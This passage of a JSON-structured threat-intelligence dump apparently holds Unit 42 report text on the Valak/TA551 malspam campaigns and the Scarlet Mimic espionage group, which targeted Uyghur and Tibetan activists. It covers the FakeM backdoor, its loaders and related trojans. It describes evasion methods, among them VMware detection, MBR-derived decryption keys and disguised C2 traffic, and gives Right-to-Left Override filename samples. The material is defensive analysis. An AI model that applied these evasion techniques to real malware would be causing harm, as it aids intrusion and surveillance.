                "Figure 20 shows configuration script from June 23, 2020, using Valak software version 40.",
                "Figure 21 shows configuration script from June 24, 2020, using Valak software version 41.",
                "Note how variable names and some of the values were obfuscated when Valak changed from version 40 to version 41."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Like most obfuscation, this is likely an attempt to evade detection.",
                "As the weeks and months progress, we predict further obfuscation in Valaks configuration script and related files."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Shathak or TA551 is the name some security researchers have given to a specific distribution method that uses password-protected ZIP archives as attachments to malspam.",
                "The distribution network may be associated with Russian cybercriminals.",
                "It has used Word document templates targeting English-, Italian-, German- and Japanese-speaking recipients.",
                "Shathak/TA551 has been active at least as early as February 2019."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Shathak/TA551 distribution has the following characteristics:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To get an idea of traffic patterns associated with Shathak/TA551, recent examples of URLs generated by the associated Word macros follow (Read: Date - URL)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As noted previously, Appendix B provides more examples of these URLs generated by Word macros associated with Shathak/TA551."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figures 22-30 provide screenshots with selected examples of malspam and the extracted Word documents associated with Shathak/TA551.",
                "These images illustrate how the Shathak/TA551 distribution has evolved since February 2019."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This distribution network has generally pushed Ursnif in previous years, but since late April 2020, weve most often seen Valak from Shathak/TA551.",
                "In some cases, we still see Ursnif from this distribution, which recently happened on June 10, 2020, and July 7, 2020."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As we enter the second half of 2020, Valak shows no signs of slowing down.",
                "We expect to see further waves of malspam from Shathak/TA551 distribution pushing Word documents with macros for Valak."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Due to its complex infection process that relies in part on registry updates with malware code, Valak can easily infect an unprotected Windows host.",
                "With ADS used to hide follow-up malware from a Valak infection, the risk is greatly increased."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "However, security best practices like running fully patched and up-to-date versions of Microsoft Windows will hinder or prevent Valak infections.",
                "Palo Alto Networks customers are further protected from Valak by our Threat Prevention subscription for the Next-Generation Firewall.",
                "AutoFocus users can search for Valak activity by using the Valak tag."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix A"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Examples of SHA256 file hashes along with the associated file names for Word documents from Shathak/TA551 distribution during June 2020.",
                "Information available at: https://raw.githubusercontent.com/pan-unit42/iocs/master/Valak/2020-June-SHA256-hashes-of-Word-docs-from-Shathak-TA551-distribution.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix B"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Examples of URLs generated by Word documents associated with Shathak/TA551.",
                "Information available at: https://raw.githubusercontent.com/pan-unit42/iocs/master/Valak/2020-03-23-to-2020-07-07-TA551-traffic-pattern-history-since-Valak.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix C"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Examples of SHA256 file hashes for Valak DLL files seen from Shathak/TA551 distribution during June 2020.",
                "Information available at: https://raw.githubusercontent.com/pan-unit42/iocs/master/Valak/2020-June-SHA256-hashes-of-Valak-DLL-files-from-Shathak-TA551-distribution.txt"
            ]
        }
    ],
    "09c8368dc51815b4d164cad614ebf12ee1a15305": [
        {
            "type": "paragraph",
            "content": [
                "Over the past seven months, Unit 42 has been investigating a series of attacks we attribute to a group we have code named Scarlet Mimic.",
                "The attacks began over four years ago and their targeting pattern suggests that this adversarys primary mission is to gather information about minority rights activists.",
                "We do not have evidence directly linking these attacks to a government source, but the information derived from these activities supports an assessment that a group or groups with motivations similar to the stated position of the Chinese government in relation to these targets is involved."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The goal of this report is to expose the tools, tactics and infrastructure deployed by Scarlet Mimic in order to increase awareness of this threat and decrease its operational success through deployment of prevention and detection countermeasures.",
                "From our vantage point, we are not able to identify which attacks have been successful against which organizations.",
                "Butthe fact that the tools Scarlet Mimic deploys have been under development for yearssuggestsan active adversarythat has been successful in some percentageofitsoperations.",
                "Based on our analysis, we are also seeing Scarlet Mimic start to expanditsespionage efforts from PCs to mobile devices, marking an evolution initstactics."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Individuals and groups of all different types may become the target of cyber espionage campaigns.",
                "The most well known victims of cyber espionage are typically government organizations or high-tech companies, but its important to recognize that espionage-focused adversaries are tasked to collect information from many sources."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The attacks we attribute to Scarlet Mimic have primarily targeted Uyghur and Tibetan activists as well as those who are interested in their causes.",
                "Both the Tibetan community and the Uyghurs, a Turkic Muslim minority residing primarily in northwest China,have been targets of multiple sophisticated attacks in the past decade.",
                "Both also have history of strained relationships with the government of the Peoples Republic of China (PRC), though we do not have evidence that links Scarlet Mimic attacks to the PRC."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Scarlet Mimic attacks have also been identifiedagainst government organizations in Russia and India, who are responsible for tracking activist and terrorist activities.",
                "While we do not know the precise target of each of the Scarlet Mimic attacks, many of them align to the patterns described above."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Scarlet Mimic attacks primarily center around the use of a Windows backdoor named FakeM. It was first described by Trend Micro in 2013 and was named FakeM because its primary command and control traffic mimicked Windows Messenger and Yahoo!",
                "Messenger network traffic to evade detection.",
                "We have identified two subsequent variants of the FakeM family, which has undergone significant changes since it was exposed in 2013.",
                "We have also identified nine distinct loader malware families, which Scarlet Mimic appears to use to avoid detection when infecting a system."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In addition to the FakeM variants, Scarlet Mimic has deployed Trojans that target the Mac OS X and Android operating systems.",
                "We have linked these attacks to Scarlet Mimic through analysis of their command and control (C2) infrastructure."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To infect individuals with access to the data the actors desire, Scarlet Mimic deploys both spear-phishing and watering hole (strategic web compromise) attacks.",
                "Using these tactics they can directly target previously identified individuals (spear phishing) as well as unidentified individuals who are interested in a specific subject (watering hole).",
                "In their spear phishing attacks, Scarlet Mimic has exploited five separate vulnerabilities.",
                "However, in many cases they chose to forgo exploiting a software vulnerability and used self-extracting (SFX) RAR archives that use the Right-to-Left Override character to mask the true file extension, tricking victims into opening executable files."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As with many other attackers who use spear-phishing to infect victims, Scarlet Mimic makes heavy use of decoy files.",
                "These are legitimate documents that contain content relevant to the subject of the spear phishing e-mail.",
                "After the system is infected, the malware displays the decoy document to trick the user into believing nothing harmful has occurred.",
                "These decoy documents allow us to identify the theme of the spear phishing e-mail and in some cases the target of the attack."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The most recent Scarlet Mimic attacks we have identified were conducted in 2015 and suggest the group has a significant interest in both Muslim activists and those interested in critiques of the Russian government and Russian President Vladimir Putin.",
                "Based on their previous targets we suspect these individuals may be targeted based on the information they posses on activist groups."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The primary source of data used in this analysis is Palo Alto Networks WildFire, which analyzes malware used in attacks across the world.",
                "The system also analyzes malware samples collected through a sharing partnership with other security vendors, including our partners in the Cyber Threat Alliance.",
                "To connect attacks to each other based on malware behavior and command and control infrastructure, we relied on AutoFocus threat intelligence.",
                "AutoFocus users can view all of the files related to Scarlet Mimic and the malware associated with the group using the following links:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The better we can understand the threats to our networks and systems, the more effective we will be at preventing those threats.",
                "The goal of this report is to help network defenders better understand attacks from a group we have named Scarlet Mimic.",
                "This group has been conducting attacks for at least four years using a backdoor Trojan that has been under active development.",
                "The group primarily deploys spear-phishing e-mails to infect its targets, but was also responsible for a watering hole (strategic web compromise) attack in 2013."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Attacks from this group have been reported publicly in the past, but mostly as disparate, unconnected incidents.",
                "Based on analysis of the data and malware samples we have collected, Unit 42 believes the attacks described herein are the work of a group or set of cooperating groups who have a single mission, collecting information on minority groups who reside in and around northwestern China.",
                "In the past, Scarlet Mimic has primarily targeted individuals who belong to these minority groups as well as their supporters, but weve recently found evidence to indicate the group also targets individuals working inside government anti-terrorist organizations.",
                "We suspect these targets are selected based on their access to information about the targeted minority groups."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the following sections we will describe selected attacks we have identified and who their likely targets are.",
                "We will also provide detailed analysis of the latest variants of the malware they deploy (known as FakeM) as well as other associated tools that allow Scarlet Mimic to target Android and OS X devices."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Attacks launched by this group were publicly exposed on 2013 in a Trend Micro report about the FakeM Trojan.",
                "Since that reports release, Scarlet Mimic has deployed two additional versions of the malware.",
                "They have also deployed nine separate loader Trojans they use to infect systems with their backdoor."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The majority of attacks we associate with Scarlet Mimic follow the pattern shown in Figure 1."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1: Spear Phishing with Decoy Attack Pattern Deployed by Scarlet Mimic"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The attacker sends a spear-phishing e-mail with a subject and body content that appeal to the targeted user.",
                "This e-mail carries an attachment, which is typically a document that exploits a Microsoft Office vulnerability.",
                "The attachment uses a file name that is related to the e-mail content to trick the user into opening it.",
                "If the user opens the file and the exploitation is successful, a backdoor Trojan is installed on the system that gives the attacker access and a decoy document is displayed to the victim.",
                "Decoy documents are typically non-malicious versions of the content the user expected to see when opening the attachment."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Many of the targets and spoofed or compromised sending e-mail addresses have contact information on the Internet.",
                "The apparent sender email usually appears to be someone associated with the accompanying text, when appropriate, while the target emails are usually also available online tied to target organizations.",
                "A small subset of the decoys could not be found online and may be from previous compromises by Scarlet Mimic."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Many attackers deploy this particular pattern, as it is often successful at infecting a user without alerting the user of the infection.",
                "This is the exact same pattern, for example, deployed by the attackers in Operation Lotus Blossom."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We have identified spear phishing documents from Scarlet Mimic exploiting the following vulnerabilities."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We also know Scarlet Mimic uses a number of toolkits to create documents that contain exploit code to install the FakeM payload on a compromised system.",
                "Unit 42 tracks the toolkits delivering FakeM under the names MNKit, WingD and Tran Duy Linh.",
                "These kits appear to be used by many attack groups, and they alone are not a good indication of Scarlet Mimic activity."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, in many cases these threat actors did not use an exploit document at all, rather they sent self-extracting (SFX) RAR archives that use the Right-to-Left Override character to mask the true file extension.",
                "For example, the following two filenames of SFX archives used to deliver FakeM contain the RLO character (bolded):"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Update about the status of Tenzin Delek Rinpoche'ashes%E2%80%AEcod.scr\ntepsiliy mezmun.\\xe2\\x80\\xaetxt.scr"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Even when no software vulnerability is exploited, the attacks still typically include a decoy document.",
                "The content of most of the decoy documents appear to be available on the open Internet, and the attackers typically made small modifications to them."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Many of the targets and spoofed or compromised sending accounts have contact information on the Internet.",
                "The apparent sender email usually appears to be someone associated with the accompanying text, when appropriate, while the target emails are usually also available online tied to target organizations.",
                "A small subset of the decoys could not be found online and may be from previous compromises by Scarlet Mimic.",
                "The overarching decoy themes were Uyghur-related, anti-Putin, or Al-Qaeda-related.",
                "The decoys are often copied from think tanks or reputable news sources the targets would likely frequent."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In one instance, the threat actors used content from a New York Times article (Figure 2) on the same day it was published."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2: Decoy Text Extracted from the New York Times article"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 3 shows one of the more common themes used to target Uyghurs and those interested in their cause.",
                "Multiple attacks used press releases or other content related to the World Uyghur Congress."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 3: Decoy using World Uyghur Congress Press Release"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In July of 2015, we identified a full e-mail uploaded to an antivirus scanning service that carried a Scarlet Mimic exploit document.",
                "In this case (Figure 4) the recipient of the e-mail was an individual working for the Russian Federal Security Service (fsb.ru).",
                "The e-mail body requests help dealing with threatening phone calls from an international gang."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 4: Phishing E-mail send to FSB E-mail Address"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Another attack, sent to an unknown target carried a decoy image (Figure 5) that compared Russian President Vladimir Putin to Adolf Hitler."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5: Anti-",
                "Putin image used as a decoy document"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In yet another case, the threat actors used a conference notification from one organization (Figure 6a) and modified it to appear as thought it was for an Islamic Country Muslim Religion Conference (Figure 6b).",
                "This document was particularly poorly altered, as the registration form still contained multiple hints to indicate the document was fraudulent (Figure 6c)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 6a: Original document used as a Psylo decoy"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 6b: Modified header and contact email in the decoy"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 6c: Bottom of the decoy document with replaced email and non-altered date -- aquick search online shows this to be fraudulent"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In total we have collected over 40 individual decoy documents used in these attacks, far more than we can detail here."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We are aware of one case where Scarlet Mimic broke from the spear-phishing pattern described above.",
                "In 2013, the group deployed a watering hole attack, also known as a strategic web compromise to infect victims with their backdoor.",
                "The watering hole is an attack vector that involves compromising a website that targeted victims are likely to visit in order to infect and gain access to their systems.",
                "According to a blog by Websense, threat actors compromised the Tibetan Alliance of Chicagos website to host malicious code that exploited a vulnerability in Internet Explorer (CVE-2012-4969.)",
                "Microsoft patched this vulnerability in September 2012, suggesting that this watering hole attack used an older vulnerability, which aligns with the threat groups continued use of older vulnerabilities in their spear-phishing efforts."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "First discussed in January 2013 in a Trend Micro whitepaper, FakeM is a Trojan that uses separate modules to perform its functionality.",
                "FakeMs functional code is shellcode-based and requires another Trojan to load it into memory and execute it.",
                "There are a variety of different Trojans used to load FakeM, some of which are more interesting than others.",
                "In this section, we will explore the loader Trojans followed by an analysis of the evolution of FakeM itself.",
                "We end this section with a discussion on tools related to FakeM and used by Scarlet Mimic."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "FakeM is shellcode-based and therefore requires another Trojan to load FakeM into memory and execute its functional code.",
                "Threat actors have developed many different loading Trojans to load FakeM, some of which are fairly straightforward while others use very clever techniques to avoid detection.",
                "Unit 42 tracks the following list of loader Trojans that Scarlet Mimic has used to execute FakeM:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It appears that the threat actors include the loader Trojans in some sort of builder application that allows actors to quickly create, configure and deploy payloads to execute FakeM. We believe this because many samples that execute FakeM have the same exact compilation time but different C2 servers, as seen in the example in Table 1.",
                "This suggests the actors compile a single sample and use a builder tool to configure individual samples on demand."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We used the loader Trojans to provide a general timeline for the development of FakeM samples, as FakeM is shellcode-based and does not contain any usable timestamps.",
                "The timestamps in the loader Trojans does not necessarily correspond to the usage of FakeM, but plotting the compile times of the loaders on a timeline shows an interesting trend.",
                "The scatter plot timeline in Figure 7 shows the known compilation times of the loader Trojans and the FakeM variant that it executed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 1: Two samples sharing a compile time yet contain different C2 domains in their configurations"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 7: Timeline of compilation of loader Trojans associated with FakeM"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Based on the timeline, it appears that the actors were actively developing several of the loaders at the same time from 2009 until the early months of 2014.",
                "After the first quarter of 2014, it appears that the actors abandoned development of the older loaders in favor of FakeFish, BrutishCommand and SubtractThis.",
                "This does not mean that actors will not continue to use the older loaders, but it does suggest that the actors will continue including the newer or freshly developed loaders in updated builder applications."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The timeline also presents the possibility that the FakeM developers reacted to the release of Trend Micros FakeM blog and whitepaper.",
                "Trend Micro published their analysis of the FakeM Trojan on January 17, 2013 (marked in Figure 7 by a red line) that discussed the original variant of FakeM. Shortly after, the original variant of FakeM drops off the timeline in favor of the SSL and Custom SSL variants.",
                "It is possible that the FakeM developers saw their tool was exposed and adapted it to avoid detection for continued use as a payload in attacks.",
                "We cannot be certain if the developers reacted specifically to Trend Micros content, as it is possible that they were reacting to the increased antivirus detection rate of their tool that resulted from the exposure of the tool.",
                "Regardless of the specific stimulus, the reaction shows that the FakeM threat actors evolved to avoid detection/attribution and to continue their attack campaigns."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The timeline does have one noticeable outlier, specifically the FakeHighFive sample compiled in September 2009 that loaded a FakeM SSL sample.",
                "We believe this compile time is incorrect, as the C2 domain for this sample, specifically press.ufoneconference[.]com, was registered by the threat actor in February 2013.",
                "The registration of the C2 domain in February 2013 aligns with other compilation times of FakeM SSL, which leads us to the conclusion that the September 2009 compilation timestamp was modified and/or inaccurate."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Most of the related loader Trojans, such as CrypticConvo, PiggyBack, FullThrottle, FakeHighFive, FakeFish and RaidBase do little more than load encrypted FakeM shellcode (either from a PE resource or embedded data), decrypt it, and execute the resulting shellcode.",
                "Other related loading Trojans, such as SubtractThis, BrutishCommand and SkiBoot employ clever techniques worth discussing."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The SubtractThis loader displays a technique that is quite clever.",
                "This loader received its name based on a technique it uses to delay before carrying out its main functionality, specifically by requiring the user to hit the minus (-) key.",
                "SubtractThis carries out this technique through the following steps:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This technique requires user interaction, which makes analysis in sandboxes more difficult."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The BrutishCommand loader uses a very interesting method to decrypt the FakeM functional code.",
                "The main function in this loader checks the command line arguments passed to it, and if there are none present it will obtain a random number between 0-9 and create a new process using the same executable with this random number as a command line argument."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the executable has a command line argument, the Trojan subjects the value to a hashing algorithm and compares the hash to 0x20E3EEBA.",
                "If the value matches the static hash, the executable will subject the command line argument to a second algorithm that will produce a value that the Trojan will use as the decryption key to decrypt the embedded FakeM shellcode.",
                "It essentially brute forces its own decryption key by rerunning itself over and over until it runs with the correct value is provided on the command line.",
                "Unit 42 had not seen this technique used by other malware families and it introduces a challenging hurdle when attempting to analyze or debug the loader Trojan."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SkiBoot reads the master boot record (MBR) of the system to determine the XOR key that it will use to decrypt the FakeM shellcode.",
                "It carries out this functionality by calling the ReadFile function to read 512-bytes from \\\\.\\PHYSICALDRIVE0 and specifically uses the last byte of the MBR as the encryption key.",
                "The last byte of the MBR is \\xAA, or the second byte of \\x55\\xAA, which is the boot signature portion of the MBR."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Instead of using ReadFile, one variant of this loader reads the MBR using DeviceIOControl using the ID_CMD control code, and accesses a specific offset to obtain the value that it will rotate each byte in the ciphertext within the decryption algorithm.",
                "The significance of using DeviceIOControl is that the VMware hypervisor responds to this API call with a blank buffer instead of the MBR, whereas the Virtualbox hypervisor returns the MBR correctly.",
                "It appears that this loader is specifically using the DeviceIOControl API function as a VMware detection technique, suggesting that the developers are well versed in the nuances of the VMware hypervisor and virtual machine evasion."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Since being originally exposed in 2013, authors of FakeM have continuously made changes to the FakeM codebase, resulting in multiple variants.",
                "Before elaborating on the different variants of FakeM, there are many similarities that remain throughout the various iterations.",
                "The architecture has not changed during the evolution of FakeM, as a modular framework exists in each variant, as seen in Figure 8.",
                "The FakeM main module is responsible for launching embedded modules, such as a keylogger or for gathering sensitive files.",
                "The main module is also responsible for communicating with its C2 servers and handling commands issued by the C2 server."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 8: FakeM Architecture"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "All FakeM variants initiate communications with its C2 server and check the C2s response for a command.",
                "Also, all FakeM variants share a common command handler with the same capabilities, as seen in Table 2.",
                "The limited command set suggests that FakeMs functionality is obtained by additional assembly code provided by the C2 server with the 0x211 command.",
                "According to Trend Micros initial analysis on FakeM, threat actors delivered and ran additional code that provided further capabilities to the Trojan, such as the ability to run shell commands, steal passwords, capture the screen and upload files."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 2: Command handler within all variants of FakeM"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Now that we have covered the commonalities between FakeM variants, the following sections will dive into the specific variants of FakeM. Unit 42 categorizes the different variations of FakeM based on the method used to communicate with the C2 server, which has changed dramatically over the years."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The original variant of FakeM generates network beacons to its C2 server that begin with a 32-byte header that in most cases is meant to blend into network traffic generated by legitimate applications.",
                "Following this 32-byte header, the original variant of FakeM includes data encrypted using a custom encryption cipher that uses an XOR key of YHCRA and bit rotation between each XOR operation."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The original variant includes the FakeM discovered and published by Trend Micro in 2013, in which the authors of FakeM first attempted to evade detection of its C2 communications by pretending to be generated by legitimate messenger applications, such as MSN and Yahoo!",
                "messengers.",
                "Figures 9 and 10 show FakeM attempting to resemble MSN or Yahoo!",
                "Messenger traffic, as the first 32-bytes contain data that resemble legitimate traffic generated by these chat programs."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 9: FakeM using fake MSN messenger traffic for C2 communication"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 10: FakeM using fake Yahoo!",
                "Messenger for C2 communication"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In addition to emulating chat programs, FakeM has also included HTML code within the 32-byte header.",
                "As you can see in Figure 11, the overall structure of the beacon did not change, rather the only differences is the data in the header contains HTML tags.",
                "The HTML data in the header led Unit 42 to a whitepaper published by Malware.lu that suggested the MSN, Yahoo, and HTML versions of the original variant of FakeM all share a common server application that the threat actors use to build samples and control infected systems."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 11: FakeM HTML tags in C2 header"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In October 2013, FireEye published a blog about a sample of FakeM that did not use fake messenger or HTML data in the first 32 bytes of the C2 traffic, but instead used four repeating bytes to fill this portion of the packet, as seen in Figure 12.",
                "Unit 42 tracks this under the original variant, as it uses the same algorithm to encrypt the data and otherwise shares a common structure to the MSN, Yahoo, and HTML versions with the exception of the modification to the first 32 bytes."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 12: FakeM C2 beacon with four repeating bytes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While performing infrastructure analysis on FakeM original variants, we came across shared infrastructure with domains that hosted C2 servers for malware samples that did not match the known FakeM communication protocols.",
                "Palo Alto Networks WildFire had analyzed many samples associated with these related C2 domains, all of which communicated with the C2 server using secure sockets layer (SSL).",
                "To determine the malware family that was generating this traffic, Unit 42 analyzed these samples and found that the functional code was the same as the original FakeM variant."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This discovery indicates the authors of FakeM introduced new code to the Trojan in order to use SSL to communicate with its C2 server.",
                "The drastic change in C2 channel warranted a new variant name, and we dubbed it FakeM SSL.",
                "During the analysis of these samples we did not find any operational C2 servers to complete a handshake to establish a SSL session.",
                "During the handshake, the FakeM SSL samples will tell the server it supports 36 different cipher suites even though the samples appear to only support one.",
                "Unit 42 believes the cipher suite within the FakeM SSL variants uses Diffie-Hellman for key exchange and the RC4 cipher to encrypt the C2 communications."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In July 2015, Scarlet Mimic delivered a spear-phishing email to a branch of the Russian government with intentions of installing a payload that was undetected by any antivirus vendors on VirusTotal.",
                "The high profile target and the lack of antivirus detection prompted Unit 42 to perform an in-depth analysis and found that it is yet another new variant of the FakeM Trojan.",
                "We also named this variant after its communication protocol (FakeM Custom SSL.)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This new variant of FakeM shared the same functional code as its predecessors, but again the communications with the C2 dramatically differed from the other variants.",
                "Communications between this variant and the C2 server leverage what Unit 42 believes is modified SSL code, as the code is very similar to the FakeM SSL variant.",
                "The code appears to use Diffie-Hellman for key exchange and the RC4 algorithm like FakeM SSL; however, the initial packet sent to the C2 server did not contain a client hello message, which is required to initiate an SSL handshake.",
                "Instead, the initial packet sent data as seen in Figure 13."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 13: Hexdump of FakeM custom SSL variant"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This variant of FakeM skips the traditional SSL handshake, which involves an agreement on a cipher suite to use to encrypt communications.",
                "The FakeM code only supports one cipher suite, which makes the cipher suite agreement portion of the SSL handshake irrelevant.",
                "Instead, FakeM creates a session with its C2 server by exchanging keys.",
                "The lack of a valid handshake makes detection of this C2 stream difficult, as the packets sent between the Trojan and the C2 to establish this session contain random binary data.",
                "Network devices will also be unable to perform any SSL decryption due to the lack of detection and the inability to determine the cipher suite used to encrypt the data.",
                "Figure 14 below provides a visual depiction of the handshake procedure and the subsequent beacon and command messages."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 14: Communications between system and C2 server, including the key exchange"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The handshake starts with a key exchange, which the Trojan initiates by creating a 2048-byte buffer that it will store its key (128-bytes, followed by null values as seen in Figure 13) and sending its key to the C2 server.",
                "The C2 will respond with its own key (also 128-bytes, followed by null values) that the Trojan will store and use to encrypt future communications."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once this key exchange is complete, the Trojan acknowledges the receipt of the servers key by sending another 2048-byte packet to the server.",
                "To build the acknowledgement packet, the Trojan creates a 2048-byte buffer filled with null values and copies the string ws32.dll to offset 8 and encrypts the buffer with the servers key."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After sending the acknowledgement packet, the Trojan will gather local system information and include it in a beacon to the C2 server.",
                "Like the packets sent in the key exchange, the beacon sent by the Trojan to the C2 server is 2048-bytes in length; however, the system information gathered by the Trojan is only 296 bytes followed by 1752 are null values to fill the 2048 byte buffer.",
                "The system information follows the 296-byte structure seen below:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan will encrypt this data using the key provided by the C2 and send it to the server.",
                "The Trojan will then wait for the C2 to respond, which it will decrypt and parse for FakeM commands.",
                "Unit 42 has been unable extract any plug-ins from C2 network traffic; however, several FakeM custom SSL samples contain embedded plug-ins that run without interaction with the C2 server.",
                "Also, Unit 42 was able to extract several modules from the original FakeM server application, as seen in Table 3.",
                "All of these modules are shellcode-based plug-ins that would work with the custom SSL variant of FakeM with little to no modification."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 3: Modules extracted from the original FakeM variant's server application"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "CallMe is a Trojan designed to run on the Apple OSX operating system.",
                "This Trojan was delivered in targeted attacks on Uyghur activists in 2013 and used infrastructure associated with FakeM."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In February 2013, AlienVault performed analysis on the CallMe Trojan and found that it is based on a tool called Tiny SHell, an OSX shell tool whose source code is available on the Internet.",
                "The Trojan uses AES to encrypt the communication channel its C2 server, which will provide one of three commands to carry out activities on the compromised system, as seen in Table 4."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 4: Commands Available in the CallMe OSX Malware"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The infrastructure overlap between FakeM and CallMe involves the fully qualified domain name (FDQN) of \"googmail.org\", which was used by both FakeM and CallMe samples.",
                "This suggests that not only do these threat actors have the ability to compromise victims running the Microsoft Windows operating system, but they can also target individuals running Apple's OSX as well."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During infrastructure analysis of FakeM Custom SSL variants, Unit 42 found infrastructure overlaps between FakeM and another new, previously unreported Trojan that we named Psylo.",
                "Psylo is a tool that allows threat actors to upload and download files to and from a compromised system, as well as execute commands and applications on the system.",
                "The name Psylo is an anagram from the mutex created when initially running this payload, which is 'hnxlopsyxt'."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Psylo is similar to FakeM in that they are both shellcode-based, and they have similar configurations and C2 communication channels.",
                "As you can see from the following two configuration structures, Psylo and FakeM have similar configurations with only the array length of the C2 locations being different."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 15: Comparison between Psylo and FakeM custom SSL configurations"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Both use SSL to communicate with their C2 servers, and it appears they share common code to carry out the Diffie Hellman key exchange.",
                "We compared the Diffie Hellman code from Psylo with FakeM custom SSL variant and found that they were very similar, but the FakeM samples had some of the functionality within sub-functions, which rendered binary diffing between the two Trojans impossible."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Another slight difference involves how Psylo and FakeM generate random numbers for SSL.",
                "FakeM uses QueryPerformanceCounter to create a random number, whereas Psylo uses CryptGenRandom, both of which generate random numbers 68 bytes long.",
